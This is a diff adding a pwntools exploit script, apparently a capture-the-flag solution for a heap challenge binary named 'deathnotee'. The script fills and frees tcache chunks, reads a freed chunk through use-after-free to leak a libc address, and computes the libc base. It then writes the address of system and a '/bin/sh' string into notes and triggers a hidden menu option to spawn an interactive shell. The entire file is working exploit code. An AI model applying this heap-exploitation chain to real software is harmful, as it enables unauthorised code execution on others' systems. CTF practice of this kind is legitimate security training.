@@ -1,0 +1,63 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+warnings.filterwarnings("ignore")
+
+exe = ELF("./deathnotee")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-linux-x86-64.so.2")
+# context.log_level='debug'
+context.terminal = ["alacritty","-e"]
+# p = remote("addr", 1337)
+p = process([exe.path])
+def gdbs():
+    gdb.attach(p, gdbscript="""
+
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+def add(idx,size,data="lmao"):
+    sla("_-_-_|","1")
+    sla("?",str(size))
+    sla("?",str(idx))
+    sla(":",data)
+def dels(idx):
+    sla("_-_-_|","2")
+    sla("?",str(idx))
+def show(idx):
+    sla("_-_-_|","3")
+    sla("?",str(idx))
+    p.recvuntil(": ")
+    return u64(p.recvuntil("\n",drop=True).ljust(8,b"\x00"))
+gdbs()
+for i in range(8):
+    add(i,0x80,str(i)*0x30)
+add(9,0x20,"lmao") 
+for i in range(8):
+    dels(i)
+# dels(7)
+addr = show(7)
+libc.address = addr -0x21ace0
+log.info(f"libc base: {hex(libc.address)}")
+add(0,0x80,hex(libc.sym.system).encode("utf-8"))
+add(1,0x80,b"/bin/sh\x00")
+sla("_-_-_|","42")
+#
+
+
+
+
+
+
+
+
+
+p.interactive()
+# good luck pwning :)
+
